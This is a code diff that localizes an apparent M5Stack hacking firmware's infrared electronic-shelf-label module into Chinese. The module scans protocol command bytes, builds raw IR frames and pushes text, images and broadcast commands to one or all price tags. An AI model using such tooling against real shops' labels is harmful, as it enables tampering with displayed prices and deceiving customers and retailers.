         }
         if (!tt_ir_stop_requested) tt_show_success("Scan complete");
     }, true});
-    tt_menu(cfg, "CMD 0x06 Byte Scan");
+    tt_menu(cfg, "CMD 0x06 字节扫描");
 }
 
 // --- 2. MCU Tunnel Sub-Command Scan (cmd 0x34, sub 0x00-0x3F) ---
@@ -55523,13 +55820,13 @@ void tt_lab_mcu_scan(const uint8_t plid[4]) {
             if (tt_ir_stop_requested) break;
             sub = (uint8_t)v;
             M5.Display.fillScreen(TFT_BLACK);
-            M5.Display.setTextFont(1); M5.Display.setTextSize(2);
+            evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 2);
             M5.Display.setCursor(5,5); M5.Display.setTextColor(TFT_YELLOW);
             M5.Display.printf("MCU sub 0x%02X (%d/64)", v, v+1);
-            M5.Display.setTextSize(1); M5.Display.setCursor(5,30); M5.Display.setTextColor(TFT_CYAN);
+            evilSetCnFont(M5.Display, 1); M5.Display.setCursor(5,30); M5.Display.setTextColor(TFT_CYAN);
             const char* known = (v==0x01)?"= REFRESH":(v==0x05)?"= IMG PARAM":(v==0x20)?"= IMG DATA":"";
             M5.Display.print(known);
-            M5.Display.setCursor(5,122); M5.Display.setTextColor(TFT_DARKGREY); M5.Display.print("[BACK] Stop");
+            M5.Display.setCursor(5,122); M5.Display.setTextColor(TFT_DARKGREY); M5.Display.print("[退格键] 停止");
             M5.Display.display();
             uint8_t buf[TT_MAX_FRAME_SIZE];
             size_t p = tt_mcu_frame(buf, plid, (uint8_t)v);
@@ -55541,7 +55838,7 @@ void tt_lab_mcu_scan(const uint8_t plid[4]) {
         }
         if (!tt_ir_stop_requested) tt_show_success("MCU scan done");
     }, true});
-    tt_menu(cfg, "MCU Sub-Cmd Scan");
+    tt_menu(cfg, "MCU 子命令扫描");
 }
 
 // --- 3. Full CMD Byte Scan (0x00-0xFF) ---
@@ -55571,13 +55868,13 @@ void tt_lab_cmd_scan(const uint8_t plid[4]) {
             if (tt_ir_stop_requested) break;
             cmd = (uint8_t)v;
             M5.Display.fillScreen(TFT_BLACK);
-            M5.Display.setTextFont(1); M5.Display.setTextSize(2);
+            evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 2);
             M5.Display.setCursor(5,5); M5.Display.setTextColor(TFT_MAGENTA);
             M5.Display.printf("CMD 0x%02X (%d/256)", v, v+1);
-            M5.Display.setTextSize(1); M5.Display.setCursor(5,30); M5.Display.setTextColor(TFT_CYAN);
+            evilSetCnFont(M5.Display, 1); M5.Display.setCursor(5,30); M5.Display.setTextColor(TFT_CYAN);
             const char* known = (v==0x06)?"= LED/PAGE":(v==0x34)?"= MCU TUNNEL":(v==0x97)?"= PING":"";
             M5.Display.print(known);
-            M5.Display.setCursor(5,122); M5.Display.setTextColor(TFT_DARKGREY); M5.Display.print("[BACK] Stop");
+            M5.Display.setCursor(5,122); M5.Display.setTextColor(TFT_DARKGREY); M5.Display.print("[退格键] 停止");
             M5.Display.display();
             uint8_t buf[TT_MAX_FRAME_SIZE];
             size_t p = tt_raw_frame(buf, TT_PROTO_DM, plid, (uint8_t)v);
@@ -55589,7 +55886,7 @@ void tt_lab_cmd_scan(const uint8_t plid[4]) {
         }
         if (!tt_ir_stop_requested) tt_show_success("CMD scan done");
     }, true});
-    tt_menu(cfg, "CMD Byte Scan");
+    tt_menu(cfg, "CMD 命令字节扫描");
 }
 
 // --- 4. Proto Byte Scan ---
@@ -55627,7 +55924,7 @@ void tt_lab_proto_scan(const uint8_t plid[4]) {
         tt_lab_send_raw(plid, buf, len, 50, t);
         tt_result_screen(t);
     }, true});
-    tt_menu(cfg, "Proto Byte Scan");
+    tt_menu(cfg, "协议字节扫描");
 }
 
 // --- 5. Param 0x88 Mystery Byte Test ---
@@ -55692,7 +55989,7 @@ void tt_lab_param88(const uint8_t plid[4], const char* barcode) {
         tt_transmit_sequence_inline(t);
         tt_result_screen(t);
     }, true});
-    tt_menu(cfg, "Param 0x88 Test");
+    tt_menu(cfg, "参数 0x88 渗透测试");
 }
 
 // --- 6. Partial Update Test (pos_x, pos_y) ---
@@ -55730,7 +56027,7 @@ void tt_lab_partial(const uint8_t plid[4]) {
         tt_transmit_sequence_inline(t);
         tt_result_screen(t);
     }, true});
-    tt_menu(cfg, "Partial Update Test");
+    tt_menu(cfg, "局刷局部更新测试");
 }
 
 // --- 7. Compression Type Test ---
@@ -55792,7 +56089,7 @@ void tt_lab_comp(const uint8_t plid[4], const char* barcode) {
         tt_transmit_sequence_inline(t);
         tt_result_screen(t);
     }, true});
-    tt_menu(cfg, "Compression Type Test");
+    tt_menu(cfg, "图像压缩类型测试");
 }
 
 // --- 8. Debug/Ping Payload Variations ---
@@ -55817,7 +56114,7 @@ void tt_lab_ping_var(const uint8_t plid[4]) {
         tt_lab_send_raw(plid, buf, len, 100, t);
         tt_result_screen(t);
     }, true});
-    tt_menu(cfg, "Ping/Debug Variations");
+    tt_menu(cfg, "Ping/调试变体探测");
 }
 
 // --- 9. Broadcast vs Targeted comparison ---
@@ -55849,7 +56146,7 @@ void tt_lab_bc_vs_tgt(const uint8_t plid[4]) {
         tt_lab_send_raw(plid, buf, len, 50, "Targeted");
         tt_result_screen("Targeted");
     }, true});
-    tt_menu(cfg, "Broadcast vs Targeted");
+    tt_menu(cfg, "广播 vs 目标对比");
 }
 
 // --- 10. Custom Raw Frame Builder ---
@@ -55897,7 +56194,7 @@ void tt_lab_raw_builder(const uint8_t plid[4]) {
         tt_lab_send_raw(p_id, buf, len, reps, "Custom");
         tt_result_screen("Custom frame");
     }, true});
-    tt_menu(cfg, "Raw Frame Builder");
+    tt_menu(cfg, "原始红外帧构建器");
 }
 
 // --- Main Protocol Lab menu ---
@@ -55907,7 +56204,7 @@ void tt_protocol_lab() {
     std::vector<String> tagLabels;
     for (uint8_t i = 0; i < tt_target_count; i++)
         tagLabels.push_back(tt_targets[i].name[0] ? tt_targets[i].name : tt_targets[i].barcode);
-    int ti = tt_menu_select(tagLabels, "Select Tag");
+    int ti = tt_menu_select(tagLabels, "选择目标价签");
     if (ti < 0) return;
     uint8_t plid[4];
     tt_barcode_to_plid(tt_targets[ti].barcode, plid);
@@ -55923,7 +56220,7 @@ void tt_protocol_lab() {
     cfg.push_back(ttItem([](){ return String("Ping Variations"); }, [&](){ tt_lab_ping_var(plid); }, true));
     cfg.push_back(ttItem([](){ return String("Broadcast vs Target"); }, [&](){ tt_lab_bc_vs_tgt(plid); }, true));
     cfg.push_back(ttItem([](){ return String("Raw Frame Builder"); }, [&](){ tt_lab_raw_builder(plid); }, true));
-    tt_menu(cfg, "Protocol Lab");
+    tt_menu(cfg, "红外协议实验室");
 }
 
 void tt_raw_frame_sender() {
@@ -55962,7 +56259,7 @@ void tt_raw_frame_sender() {
             if (!tt_result_screen("Raw Frame")) break;
         }
     }, true});
-    tt_menu(cfg, "Raw Frame Sender");
+    tt_menu(cfg, "原始红外帧发送器");
 }
 // =====================================================================
 
@@ -56052,7 +56349,7 @@ void tt_send_pixels_to_tag(uint8_t* pixels, uint16_t w, uint16_t h, const uint8_
 void tt_online_send(uint8_t* pixels, uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor) {
     M5.Display.fillScreen(TFT_BLACK);
     M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-    M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
+    evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 3); M5.Display.setTextColor(TFT_GREEN);
     M5.Display.printf("Preview %ux%u", w, h);
     tt_preview_pixels(pixels, w, h, 20);
@@ -56076,9 +56373,9 @@ int ts(uint16_t h, int base) {
 
 void tt_online_crypto(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor) {
     if (!tt_check_wifi()) return;
-    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextFont(1);
-    M5.Display.setCursor(10, 50); M5.Display.setTextSize(1.5);
-    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("Fetching crypto...");
+    M5.Display.fillScreen(TFT_BLACK); evilKeepCnFont(M5.Display);
+    M5.Display.setCursor(10, 50); evilSetCnFont(M5.Display, 1.5);
+    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("正在拉取加密货币行情...");
     M5.Display.display();
 
     float btcUsd=0, btcEur=0, ethUsd=0, ethEur=0;
@@ -56093,7 +56390,7 @@ void tt_online_crypto(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor
         ethUsd = doc["ethereum"]["usd"]; ethEur = doc["ethereum"]["eur"];
     }
 
-    M5.Display.setCursor(10, 65); M5.Display.print("Fetching graph...");
+    M5.Display.setCursor(10, 65); M5.Display.print("正在拉取行情走势图...");
     M5.Display.display();
 
     {
@@ -56192,11 +56489,11 @@ void tt_online_weather(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColo
 
     std::vector<String> cityLabels;
     for (int i = 0; i < tt_city_count; i++) cityLabels.push_back(tt_cities[i].name);
-    int ci = tt_menu_select(cityLabels, "Select City");
+    int ci = tt_menu_select(cityLabels, "选择天气城市");
     if (ci < 0) return;
 
-    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextFont(1);
-    M5.Display.setCursor(10, 50); M5.Display.setTextSize(1.5);
+    M5.Display.fillScreen(TFT_BLACK); evilKeepCnFont(M5.Display);
+    M5.Display.setCursor(10, 50); evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_GREEN); M5.Display.printf("Weather %s...", tt_cities[ci].name);
     M5.Display.display();
 
@@ -56239,9 +56536,9 @@ void tt_online_weather(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColo
 
 void tt_online_clock(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor) {
     if (!tt_check_wifi()) return;
-    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextFont(1);
-    M5.Display.setCursor(10, 50); M5.Display.setTextSize(1.5);
-    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("Fetching time...");
+    M5.Display.fillScreen(TFT_BLACK); evilKeepCnFont(M5.Display);
+    M5.Display.setCursor(10, 50); evilSetCnFont(M5.Display, 1.5);
+    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("正在同步网络时间...");
     M5.Display.display();
 
     int hour, minute, day, month, year; String dowStr;
@@ -56280,9 +56577,9 @@ void tt_online_clock(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor)
 
 void tt_online_quote(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor) {
     if (!tt_check_wifi()) return;
-    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextFont(1);
-    M5.Display.setCursor(10, 50); M5.Display.setTextSize(1.5);
-    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("Fetching quote...");
+    M5.Display.fillScreen(TFT_BLACK); evilKeepCnFont(M5.Display);
+    M5.Display.setCursor(10, 50); evilSetCnFont(M5.Display, 1.5);
+    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("正在获取名人名言...");
     M5.Display.display();
 
     String quote, author;
@@ -56312,9 +56609,9 @@ void tt_online_quote(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor)
     cfg.push_back({[](){ return String("Preview & Send"); }, [&](){
         uint8_t* pixels = tt_render_canvas(w, h, [&](M5Canvas& c) {
             c.drawRect(0, 0, w, h, TFT_WHITE);
-            c.setTextSize(qSize); c.setTextWrap(true, true);
+            evilSetCnFont(c, qSize); c.setTextWrap(true, true);
             c.setCursor(6, 6); c.print("\""); c.print(quote); c.print("\"");
-            c.setTextSize(1);
+            evilSetCnFont(c, 1);
             c.setCursor(w/2, h - 12); c.print("- "); c.print(author);
         });
         if (!pixels) { tt_show_error("Memory"); return; }
@@ -56322,16 +56619,16 @@ void tt_online_quote(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor)
         tt_online_send(pixels, w, h, plid, hasColor);
         free(pixels);
     }, true});
-    tt_menu(cfg, "Quote Config");
+    tt_menu(cfg, "名言参数配置");
 }
 
 // --- FUN FACT ---
 
 void tt_online_fact(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor) {
     if (!tt_check_wifi()) return;
-    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextFont(1);
-    M5.Display.setCursor(10, 50); M5.Display.setTextSize(1.5);
-    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("Fetching fact...");
+    M5.Display.fillScreen(TFT_BLACK); evilKeepCnFont(M5.Display);
+    M5.Display.setCursor(10, 50); evilSetCnFont(M5.Display, 1.5);
+    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("正在获取趣味冷知识...");
     M5.Display.display();
 
     String factStr;
@@ -56345,13 +56642,13 @@ void tt_online_fact(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor) 
 
     uint8_t* pixels = tt_render_canvas(w, h, [&](M5Canvas& c) {
         c.drawRect(0, 0, w, h, TFT_WHITE);
-        c.setTextSize(2);
+        evilSetCnFont(c, 2);
         c.fillCircle(14, 14, 9, TFT_WHITE);
         c.setTextColor(TFT_BLACK); c.setCursor(9, 5); c.print("!");
         c.setTextColor(TFT_WHITE, TFT_BLACK);
         c.setCursor(28, 4); c.print("Did you know?");
         c.drawLine(2, 28, w - 3, 28, TFT_WHITE);
-        c.setTextSize(1); c.setTextWrap(true, true);
+        evilSetCnFont(c, 1); c.setTextWrap(true, true);
         c.setCursor(6, 34); c.print(factStr);
     });
     if (!pixels) { tt_show_error("Memory"); return; }
@@ -56363,9 +56660,9 @@ void tt_online_fact(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor) 
 
 void tt_online_iss(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor) {
     if (!tt_check_wifi()) return;
-    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextFont(1);
-    M5.Display.setCursor(10, 50); M5.Display.setTextSize(1.5);
-    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("Fetching ISS...");
+    M5.Display.fillScreen(TFT_BLACK); evilKeepCnFont(M5.Display);
+    M5.Display.setCursor(10, 50); evilSetCnFont(M5.Display, 1.5);
+    M5.Display.setTextColor(TFT_GREEN); M5.Display.print("正在追踪空间站位置...");
     M5.Display.display();
 
     float lat, lon, alt, vel;
@@ -56439,7 +56736,7 @@ void tt_online_iss(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor) {
         c.drawCircle(issX, issY, 5, TFT_WHITE);
         c.drawLine(issX-7, issY, issX+7, issY, TFT_WHITE);
 
-        c.setTextSize(1);
+        evilSetCnFont(c, 1);
         int iy = mapH + 4;
         char buf[42];
         snprintf(buf, sizeof(buf), "Alt:%.0fkm Spd:%.0fkm/h", alt, vel);
@@ -56460,8 +56757,8 @@ void tt_online_github(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor
     String user = tt_get_text_input("GitHub username", false);
     if (user.length() == 0) return;
 
-    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextFont(1);
-    M5.Display.setCursor(10, 50); M5.Display.setTextSize(1.5);
+    M5.Display.fillScreen(TFT_BLACK); evilKeepCnFont(M5.Display);
+    M5.Display.setCursor(10, 50); evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_GREEN); M5.Display.printf("Fetching %s...", user.c_str());
     M5.Display.display();
 
@@ -56506,11 +56803,11 @@ void tt_online_github(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor
         }
 
         int tx = iconX + gridSz * cellW + 6;
-        c.setTextSize(2); c.setCursor(tx, 4); c.print(name);
-        c.setTextSize(1); c.setCursor(tx, 22); c.print("@"); c.print(login);
+        evilSetCnFont(c, 2); c.setCursor(tx, 4); c.print(name);
+        evilSetCnFont(c, 1); c.setCursor(tx, 22); c.print("@"); c.print(login);
 
         if (bio.length() > 0) {
-            c.setTextSize(1); c.setTextWrap(true, true);
+            evilSetCnFont(c, 1); c.setTextWrap(true, true);
             c.setCursor(tx, 36);
             String shortBio = bio.substring(0, 60);
             c.print(shortBio);
@@ -56518,7 +56815,7 @@ void tt_online_github(uint16_t w, uint16_t h, const uint8_t* plid, bool hasColor
 
         int infoY = h/2 + 4;
         c.drawLine(2, infoY - 2, w - 3, infoY - 2, TFT_WHITE);
-        c.setTextSize(1);
+        evilSetCnFont(c, 1);
         char buf[64];
         snprintf(buf, sizeof(buf), "Followers: %d  Repos: %d", followers, repos);
         c.setCursor(4, infoY); c.print(buf);
@@ -56569,7 +56866,7 @@ void tt_online_identicon(uint16_t w, uint16_t h, const uint8_t* plid, bool hasCo
             }
         }
 
-        c.setTextSize(1);
+        evilSetCnFont(c, 1);
         c.setCursor((w - seed.length() * 6) / 2, h - 14);
         c.print(seed);
     });
@@ -56582,15 +56879,15 @@ void tt_online_identicon(uint16_t w, uint16_t h, const uint8_t* plid, bool hasCo
 
 void tt_online_content_with(const uint8_t* plid, uint16_t w, uint16_t h, bool hasColor) {
     std::vector<TtMenuItem> menu;
-    menu.push_back(ttItem([](){ return String("Crypto Ticker"); }, [&](){ tt_online_crypto(w, h, plid, hasColor); }, true));
-    menu.push_back(ttItem([](){ return String("Weather"); }, [&](){ tt_online_weather(w, h, plid, hasColor); }, true));
-    menu.push_back(ttItem([](){ return String("Clock"); }, [&](){ tt_online_clock(w, h, plid, hasColor); }, true));
-    menu.push_back(ttItem([](){ return String("ISS Tracker"); }, [&](){ tt_online_iss(w, h, plid, hasColor); }, true));
-    menu.push_back(ttItem([](){ return String("Random Quote"); }, [&](){ tt_online_quote(w, h, plid, hasColor); }, true));
-    menu.push_back(ttItem([](){ return String("Fun Fact"); }, [&](){ tt_online_fact(w, h, plid, hasColor); }, true));
-    menu.push_back(ttItem([](){ return String("GitHub Profile"); }, [&](){ tt_online_github(w, h, plid, hasColor); }, true));
-    menu.push_back(ttItem([](){ return String("Identicon"); }, [&](){ tt_online_identicon(w, h, plid, hasColor); }, true));
-    tt_menu(menu, "Online Content");
+    menu.push_back(ttItem([](){ return String("加密货币行情"); }, [&](){ tt_online_crypto(w, h, plid, hasColor); }, true));
+    menu.push_back(ttItem([](){ return String("实时天气预报"); }, [&](){ tt_online_weather(w, h, plid, hasColor); }, true));
+    menu.push_back(ttItem([](){ return String("网络时钟表盘"); }, [&](){ tt_online_clock(w, h, plid, hasColor); }, true));
+    menu.push_back(ttItem([](){ return String("空间站轨迹追踪"); }, [&](){ tt_online_iss(w, h, plid, hasColor); }, true));
+    menu.push_back(ttItem([](){ return String("随机名人名言"); }, [&](){ tt_online_quote(w, h, plid, hasColor); }, true));
+    menu.push_back(ttItem([](){ return String("趣味百科冷知识"); }, [&](){ tt_online_fact(w, h, plid, hasColor); }, true));
+    menu.push_back(ttItem([](){ return String("GitHub 个人资料"); }, [&](){ tt_online_github(w, h, plid, hasColor); }, true));
+    menu.push_back(ttItem([](){ return String("哈希像素头像"); }, [&](){ tt_online_identicon(w, h, plid, hasColor); }, true));
+    tt_menu(menu, "在线内容推送");
 }
 
 void tt_online_content() {
@@ -56629,7 +56926,7 @@ void tt_wifi_icon_off_all() {
         uint8_t plid[4];
         if (!tt_barcode_to_plid(tt_targets[i].barcode, plid)) continue;
         M5.Display.fillScreen(TFT_BLACK);
-        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
+        evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5);
         M5.Display.setCursor(5, 5); M5.Display.setTextColor(TFT_GREEN);
         M5.Display.printf("Clear %d/%d", i+1, tt_target_count);
         M5.Display.setCursor(5, 25); M5.Display.setTextColor(TFT_WHITE);
@@ -56725,7 +57022,7 @@ void tt_nfc_decoder_menu() {
             tt_target_add(barcode, "NFC scan");
             tt_show_success("Saved!");
         }, true});
-        tt_menu(info, "NFC Decoded");
+        tt_menu(info, "NFC 价签解码");
     } else {
         tt_show_error("Invalid NFC code");
     }
@@ -56786,7 +57083,7 @@ void tt_push_text_all() {
             bool hc = colorClear && prof.known && prof.color != TT_COLOR_MONO;
 
             M5.Display.fillScreen(TFT_BLACK);
-            M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
+            evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5);
             M5.Display.setCursor(5, 5); M5.Display.setTextColor(TFT_GREEN);
             M5.Display.printf("ALL %d/%d", i+1, tt_target_count);
             M5.Display.setCursor(5, 25); M5.Display.setTextColor(TFT_WHITE);
@@ -56838,7 +57135,7 @@ void tt_push_image_all() {
         if (sn.startsWith("/evil/esl/")) sn = sn.substring(10);
         labels.push_back(sn);
     }
-    int sel = tt_menu_select(labels, "Select BMP for ALL");
+    int sel = tt_menu_select(labels, "选择全员推送的 BMP 图像");
     if (sel < 0) return;
 
     bool imgInvert = true;
@@ -56858,7 +57155,7 @@ void tt_push_image_all() {
             bool hc = prof.known && prof.color != TT_COLOR_MONO;
 
             M5.Display.fillScreen(TFT_BLACK);
-            M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
+            evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5);
             M5.Display.setCursor(5, 5); M5.Display.setTextColor(TFT_GREEN);
             M5.Display.printf("ALL %d/%d", i+1, tt_target_count);
             M5.Display.setCursor(5, 25); M5.Display.setTextColor(TFT_WHITE);
@@ -57339,30 +57636,30 @@ bool tt_handle_serial(const String& command) {
 void tagTinkerMenu() {
     std::vector<TtMenuItem> menu;
     // --- Tags ---
-    menu.push_back(ttItem([](){ return String("Saved Tags"); }, [](){ tt_saved_targets_menu(); }, true));
-    menu.push_back(ttItem([](){ return String("Tag Info"); }, [](){ tt_show_tag_info(); }, true));
-    menu.push_back(ttItem([](){ return String("NFC Decoder"); }, [](){ tt_nfc_decoder_menu(); }, true));
+    menu.push_back(ttItem([](){ return String("已存价签列表"); }, [](){ tt_saved_targets_menu(); }, true));
+    menu.push_back(ttItem([](){ return String("价签详细信息"); }, [](){ tt_show_tag_info(); }, true));
+    menu.push_back(ttItem([](){ return String("NFC 解码工具"); }, [](){ tt_nfc_decoder_menu(); }, true));
     // --- Push Content ---
-    menu.push_back(ttItem([](){ return String("Push Text"); }, [](){ tt_push_text(); }, true));
-    menu.push_back(ttItem([](){ return String("Push Text ALL"); }, [](){ tt_push_text_all(); }, true));
-    menu.push_back(ttItem([](){ return String("Push Image"); }, [](){ tt_push_image(); }, true));
-    menu.push_back(ttItem([](){ return String("Push Image ALL"); }, [](){ tt_push_image_all(); }, true));
-    menu.push_back(ttItem([](){ return String("Online Content"); }, [](){ tt_online_content(); }, true));
-    menu.push_back(ttItem([](){ return String("Text Presets"); }, [](){ tt_presets_menu(); }, true));
+    menu.push_back(ttItem([](){ return String("推送文本信息"); }, [](){ tt_push_text(); }, true));
+    menu.push_back(ttItem([](){ return String("全员推送文本"); }, [](){ tt_push_text_all(); }, true));
+    menu.push_back(ttItem([](){ return String("推送图像内容"); }, [](){ tt_push_image(); }, true));
+    menu.push_back(ttItem([](){ return String("全员推送图像"); }, [](){ tt_push_image_all(); }, true));
+    menu.push_back(ttItem([](){ return String("在线网络内容"); }, [](){ tt_online_content(); }, true));
+    menu.push_back(ttItem([](){ return String("预设文本模板"); }, [](){ tt_presets_menu(); }, true));
     // --- LED ---
-    menu.push_back(ttItem([](){ return String("LED Test"); }, [](){ tt_led_test(); }, true));
+    menu.push_back(ttItem([](){ return String("LED 闪烁测试"); }, [](){ tt_led_test(); }, true));
     // --- Broadcast ---
-    menu.push_back(ttItem([](){ return String("Broadcast Page Flip"); }, [](){ tt_broadcast_page_flip(); }, true));
-    menu.push_back(ttItem([](){ return String("Broadcast Debug"); }, [](){ tt_broadcast_debug(); }, true));
-    menu.push_back(ttItem([](){ return String("Broadcast LED"); }, [](){ tt_broadcast_led(); }, true));
-    menu.push_back(ttItem([](){ return String("WiFi Icon ON (Broadcast)"); }, [](){ tt_wifi_icon_on(); }, true));
-    menu.push_back(ttItem([](){ return String("WiFi Icon OFF (All)"); }, [](){ tt_wifi_icon_off_all(); }, true));
+    menu.push_back(ttItem([](){ return String("广播翻页指令"); }, [](){ tt_broadcast_page_flip(); }, true));
+    menu.push_back(ttItem([](){ return String("广播调试指令"); }, [](){ tt_broadcast_debug(); }, true));
+    menu.push_back(ttItem([](){ return String("广播 LED 控制"); }, [](){ tt_broadcast_led(); }, true));
+    menu.push_back(ttItem([](){ return String("开启 WiFi 图标(广播)"); }, [](){ tt_wifi_icon_on(); }, true));
+    menu.push_back(ttItem([](){ return String("关闭 WiFi 图标(全员)"); }, [](){ tt_wifi_icon_off_all(); }, true));
     // --- Tools ---
-    menu.push_back(ttItem([](){ return String("Raw Frame"); }, [](){ tt_raw_frame_sender(); }, true));
-    menu.push_back(ttItem([](){ return String("LED Explorer"); }, [](){ tt_led_explorer(); }, true));
-    menu.push_back(ttItem([](){ return String("Protocol Lab"); }, [](){ tt_protocol_lab(); }, true));
-    menu.push_back(ttItem([](){ return String("Settings"); }, [](){ tt_settings_menu(); }, true));
-    tt_menu(menu, "TagTinker ESL IR");
+    menu.push_back(ttItem([](){ return String("原始红外数据帧"); }, [](){ tt_raw_frame_sender(); }, true));
+    menu.push_back(ttItem([](){ return String("LED 闪烁探索器"); }, [](){ tt_led_explorer(); }, true));
+    menu.push_back(ttItem([](){ return String("红外协议实验室"); }, [](){ tt_protocol_lab(); }, true));
+    menu.push_back(ttItem([](){ return String("价签设置与管理"); }, [](){ tt_settings_menu(); }, true));
+    tt_menu(menu, "TagTinker 红外价签");
     inMenu = true;
 }
 
